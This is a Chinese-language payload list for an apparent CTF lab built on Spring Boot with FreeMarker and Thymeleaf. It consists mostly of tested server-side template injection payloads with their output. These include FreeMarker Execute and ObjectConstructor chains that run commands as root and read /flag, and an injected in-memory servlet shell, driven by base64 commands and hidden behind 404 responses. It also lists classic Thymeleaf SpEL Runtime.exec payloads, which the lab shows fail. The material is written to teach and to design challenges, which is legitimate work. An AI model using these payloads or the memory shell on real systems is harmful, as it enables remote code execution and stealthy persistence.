# Payload 清单（含实测输出）

所有 payload 都在本机实测过：镜像 `ctf/freemarker-memshell:latest`（Spring Boot 2.7.18 /
内嵌 Tomcat 9.0.83 / JDK 8 / FreeMarker 2.3.28 / Thymeleaf 3.0.15），端口 `8098`。

`$base` 统一表示 `http://127.0.0.1:8098`。

> **URL 编码提醒**：`${` `}` 在 query 里最好编码。下面 PowerShell 用
> `[uri]::EscapeDataString`，curl 用 `-G --data-urlencode`。

---

## 1. 确认引擎

```bash
curl -s -G "$base/theme/preview" --data-urlencode 'template=${7*7}'                    # 49
curl -s -G "$base/theme/preview" --data-urlencode 'template=<#list 1..3 as i>${i}</#list>'  # 123
curl -s -G "$base/theme/preview" --data-urlencode 'template=${.version}'               # 2.3.28
```

`.version` 能直接暴露引擎版本，用来判断目标离哪个 payload 更近 →
**2.3.28 说明 `freemarker.template.utility.Execute` 还在。**

## 2. FreeMarker 入口（`/theme/preview?template=`）

### 2.1 代码执行：`freemarker.template.utility.Execute`

```text
${"freemarker.template.utility.Execute"?new()("id")}
${"freemarker.template.utility.Execute"?new()("cat /flag")}
${"freemarker.template.utility.Execute"?new()("sh -c 'id; cat /flag'")}
```

实测：

```text
$ curl -s -G "$base/theme/preview" --data-urlencode 'template=${"freemarker.template.utility.Execute"?new()("id")}'
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

**语义坑（实测）**：`Execute.exec()` 把参数里的空白切开，逐个作为
`Runtime.exec(String[])` 的元素，**不经过 shell**。所以：

- `"cat /flag"` ✅ 可行（两个 argv，`cat` 自己会读文件）；
- `"id; cat /flag"` ❌ 会被当成 `id;` `cat` `/flag` 三个 argv，`cat` 报找不到文件；
- 要 `;` `|` `>` 这类 shell 语义，必须自己包一层：`"sh -c 'cat /flag > /tmp/x'"`。

### 2.2 一个必须知道的前提：`?new` 只认 `TemplateModel`

实测（FreeMarker 2.3.28）：

```text
${"java.lang.Runtime"?new()}        → freemarker.core._MiscTemplateException:
                                      Class java.lang.Runtime does not implement freemarker.template.TemplateModel
${"java.lang.String"?new("x")}      → 同样的报错
${"freemarker.template.utility.Execute"?new()("id")}   → ✅ 正常执行
```

`?new` 不是「任意类的通用构造器」——它要求目标类**实现
`freemarker.template.TemplateModel`**（或其子接口）。所以：

- 能直接 `?new` 的只有 FreeMarker 自带的工具类：`Execute`、`ObjectConstructor`、
  `JythonRuntime`，以及你自己写进 classpath 的 `TemplateModel` 实现
  （本靶场的 `InjectHelper` 就是为此实现了 `TemplateMethodModelEx`）。
- `Runtime` / `ProcessBuilder` / `ScriptEngineManager` 这类普通类**不能**直接 `?new`。

**要构造任意普通类，用 `ObjectConstructor`**（它自己就是 `TemplateMethodModelEx`）：

```text
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.String","x")}       # → x
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id")}  # → java.lang.ProcessBuilder@227b18a2
```

拿到的对象是 `SimpleScalar` 包装，**没有方法调用/回显能力**，
所以它更适合做「构造 + 触发」型 payload（构造函数有副作用时），而不是交互式 RCE。

### 2.3 结论：本靶场命令执行就用 `Execute`

`Execute` 是本靶场（FreeMarker 2.3.28）里最直接、有回显的命令执行原语。
`ScriptEngineManager`(Nashorn) 路线**不能**用 `${"javax.script.ScriptEngineManager"?new()...}` 写——
原因就是上面的 `TemplateModel` 限制（实测报错：
`Class javax.script.ScriptEngineManager does not implement freemarker.template.TemplateModel`）。
想走 JS 引擎需要先用 `ObjectConstructor` 构造，或自己在 classpath 里放一个
`TemplateModel` 包装类；本靶场不依赖它，故不把未验证的写法写进来。

### 2.4 内存马注入（一条就走完）

```text
${"com.lab.themepreview.memshell.InjectHelper"?new(servletContext)()}
```

实测回显：

```text
OK GET /memshell?cmd=id | filterMapped=true | filterStart=true | ctx=org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext | filterLoader=org.springframework.boot.loader.LaunchedURLClassLoader@21b8d17c
```

- `servletContext` 是 FreeMarker 数据模型里的变量（控制器 `model.put("servletContext", request.getServletContext())`），
  可由 `GET /api/theme-vars` 查到；
- `?new(...)` 的形参用 `Object` 接收 `ServletContext`，FreeMarker 会做类型包装与还原；
- `InjectHelper` 实现了 `freemarker.template.TemplateMethodModelEx`，
  所以 `?new(servletContext)` 之后紧跟 `()` 就能把注入结果回显出来。

### 2.4 内存马调用

```text
GET /memshell?cmd=id                       → uid=0(root) ...
GET /memshell?cmd=cat%20/flag              → flag{...}
GET /memshell?b64cmd=Y2F0IC9mbGFn          → flag{...}   （b64cmd 优先级更高，适合带引号/管道的命令）
GET /memshell                              → 404，原样放行业务链（隐蔽性）
```

```bash
# b64cmd = base64("cat /flag")
$ curl -s -G "$base/memshell" --data-urlencode 'b64cmd=Y2F0IC9mbGFn'
# b64cmd = base64("cat /flag | base64 -w0")
$ curl -s -G "$base/memshell" --data-urlencode 'b64cmd=Y2F0IC9mbGFnIHwgYmFzZTY0IC13MA=='
```

### 2.5 其它可利用点（同一配置错误的延伸，供出题参考）

```text
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id")}   # → 构造成功（无回显）
${"freemarker.template.utility.JythonRuntime"?new()}    # 需要 jython 在 classpath，本镜像里没有
```

真正被 `UNRESTRICTED_RESOLVER` 放开的是**「能把哪些类交给 `?new` 解析」**这一层；
再叠加「目标类必须实现 `TemplateModel`」这条硬限制，实际能直接用的就是上面这几个工具类。
这也是为什么 `Execute` 一旦被官方移除（2.3.30+），只留 `ObjectConstructor` 的链
会明显变难——出题时可以用这个差异设计难度梯度。


## 3. Thymeleaf 入口

### 3.1 请求形态

```text
GET /theme/thymeleaf?theme=aurora                     → 200，渲染 templates/theme/aurora.html
GET /theme/thymeleaf?theme=<任意内容>                  → 视图名 = "theme/" + 用户输入
GET /theme/thymeleaf?theme=aurora&fragment=header     → 200，包含 fragments/header.html 的 body 片段
```

### 3.2 经典（CVE-2021-25741 时代）payload

```text
?theme=__${T(java.lang.Runtime).getRuntime().exec('id')}__
?theme=__${new java.util.Scanner(new java.io.File("/flag")).useDelimiter("\\A").next()}__
?fragment=__${T(java.lang.Runtime).getRuntime().exec('id')}__
```

### 3.3 ⚠ 实测结论：本技术栈上这些 payload **不会执行**

在 Thymeleaf **3.0.15**（Boot 2.7.18 默认）与本机把容器内版本换成
**3.0.11.RELEASE** 后，结果一致——**模板名/片段名都是字面量，不做 SpEL 求值**：

| 请求 | 实测响应 |
|------|----------|
| `theme=aurora` | `200`，正常渲染 |
| `theme=__${7*7}__` | `500`，`Error resolving template [theme/__${7*7}__]` ← 原样 |
| `theme=__${100+1}__` | `500`，`resolved=[theme/__${100+1}__]` ← 原样 |
| `fragment=header` | `200`，片段被包含 |
| `fragment=__${7*7}__` | `500`，`resolved=[fragments/__${7*7}__]` ← 原样 |
| `fragment=__${'hea'.concat('der')}__` | `500`，仍是字面量（若求值应为 `header` → 200） |

也就是说：**「用户可控的模板名/片段名」本身并不构成 SpEL 注入点**，
很多网文把这两件事混为一谈。真正的求值点在模板**内部**的 `th:*` 表达式上。

### 3.4 这条入口的教学用法（对照题）

- 用来演示「注入面存在 ≠ 可 RCE」：同一份代码里 FreeMarker 一条就打通了，
  Thymeleaf 这条却打不通，逼同学去读 Thymeleaf 的解析顺序、而不是背 payload；
- 想让它真能 RCE，需要业务里存在别的求值点，典型两种：
  1. 模板把用户输入**拼进表达式源码**：
     `model.addAttribute("expr", userInput)` + 模板 `th:utext="${__${expr}__}"`；
  2. 用户输入进入 `th:*` 属性值本身（例如
     `th:replace="${userControlledFullExpression}"`）。

  本靶场故意**没有**这两种写法，以保持结论真实。

## 4. 验收辅助

```bash
curl -s "$base/api/lab-info" | jq '{id,no_egress,engine,flag_path,levels:[.levels[].title]}'
curl -s "$base/api/theme-vars" | jq
curl -s "$base/api/diag/context" | jq '.chain[] | {class, field_context_type, value_class}'
curl -s "$base/api/memshell-class" | head -c 120 ; echo   # 内存马字节码 base64（可自行 base64 -d 反编译核对）
```

`docs/` 与站点自带的完整复现脚本：[`../tests/verify_chain.ps1`](../tests/verify_chain.ps1)。
